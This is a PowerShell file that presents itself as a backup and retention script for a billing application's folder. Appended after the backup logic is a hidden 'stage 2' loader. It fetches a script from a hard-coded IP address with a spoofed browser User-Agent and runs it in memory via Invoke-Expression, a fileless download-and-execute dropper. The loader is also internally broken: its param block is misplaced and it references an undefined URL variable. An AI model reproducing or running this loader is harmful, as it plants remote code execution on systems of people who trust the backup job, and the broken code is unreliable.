$SourcePath = "C:\Apps\Contoso.Billing"
$BackupRoot = "E:\Backups\Billing"
$RetentionDays = 7
$CompressionLevel = 'NoCompression'
$MinFreeGB = 10
$DryRun = $false

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path $BackupRoot ("billing-" + $stamp + ".zip")
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel
$cutoff = (Get-Date).AddDays(-$RetentionDays)
Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff } |
    Remove-Item -Force -WhatIf:$DryRun
Write-Host ("Backup written to {0}" -f $archive) -ForegroundColor Green
<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://203.0.113.8:80/stage2.ps1",
    [int]$TimeoutSec = 140
)
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $PayloadText = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($PayloadText)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $PayloadText.Length)
    Invoke-Expression $PayloadText
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
